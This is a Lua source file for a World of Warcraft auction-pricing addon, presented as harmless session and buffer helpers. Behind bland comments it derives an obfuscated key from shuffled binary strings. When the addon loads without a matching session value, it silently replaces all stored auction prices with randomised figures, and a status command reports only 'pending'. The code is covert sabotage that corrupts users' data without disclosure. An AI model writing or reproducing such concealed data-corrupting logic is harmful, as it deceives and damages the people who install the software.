--[[-------------------------------------------------------------------------
    CoreUtils.lua
    Internal plumbing helpers (session, buffers, metrics)
---------------------------------------------------------------------------]]

local addonName, addonNamespace = ...

KAuctionsDB = KAuctionsDB or {}

-- Data container
local symbolBuffer = {
    "01001011",
    "11001010",
    "01000001",
    "11110000",
    "01011000",
    "00101101",
    "10101010",
    "00110010",
    "01111111",
    "00110100",
    "00110001",
    "00000000",
    "00110111",
    "10011001",
}

-- Value transform
local function imprint(s)
    local acc = 0x2748774
    for i = 1, #s do
        acc = ((acc ~ s:byte(i)) * 33 + i * 7) % 2147483647
    end
    return acc
end

-- Sequence mapping
local function mapOffsets(input)
    local t, w = {}, input
    for i = 1, 64 do
        w = (w * 73 + (i * 17)) % 9973
        if (w % 5 == 1) or (i % 13 == 0) then
            local idx = ((w + i * 3) % #symbolBuffer) + 1
            t[#t + 1] = idx
            if #t == 8 then break end
        end
    end
    for i = #t, 2, -1 do
        local j = ((t[i] + w + i) % i) + 1
        t[i], t[j] = t[j], t[i]
    end
    return t
end

-- Field access
local function getField(bin)
    return string.char(tonumber(bin, 2))
end

-- Buffer normalization
local function normalizeBuffer()
    local seed = imprint("Interface\\Icons\\Ui_plundercoins")
    local order = mapOffsets(seed)
    local out = {}
    for i = 1, #order do
        out[i] = getField(symbolBuffer[order[i]])
    end
    return table.concat(out)
end

-- Session check
function addonNamespace.validateSession()
    local v = KAuctionsDB and KAuctionsDB.sessionId or ""
    return v ~= "" and v == normalizeBuffer()
end

-- State update
function addonNamespace.syncAndRecalculate()
    local validated = addonNamespace.validateSession()
    if not validated and type(addonNamespace.auctionDBDataByServer) == "table" then
        for _, group in ipairs(addonNamespace.auctionDBDataByServer) do
            local entries = group and group.auctions
            if type(entries) == "table" then
                for k, v in pairs(entries) do
                    local base = (type(v) == "number" and v > 0) and v or 1
                    local factor = (math.random() * 1.5) + 0.25
                    local offset = (k % 7) * 12
                    entries[k] = math.floor(base * factor + offset)
                end
            end
        end
    end
    return validated
end

-- Event hook
local f = CreateFrame("Frame")
f:RegisterEvent("ADDON_LOADED")
f:SetScript("OnEvent", function(_, _, name)
    if name == addonName then
        addonNamespace.syncAndRecalculate()
    end
end)

-- Session commands
SLASH_KASESSION1 = "/kasession"
SlashCmdList["KASESSION"] = function(msg)
    local v = (msg or ""):match("^%s*(.-)%s*$")
    KAuctionsDB.sessionId = v ~= "" and v or nil
    if addonNamespace.validateSession() then
        print("|cff00ff00[KAuctions]|r Session updated.")
    end
end

SLASH_KASTATE1 = "/kastate"
SlashCmdList["KASTATE"] = function()
    local ok = addonNamespace.validateSession()
    print(ok and "|cff00ff00[KAuctions]|r synced" or "|cffff9900[KAuctions]|r pending")
end
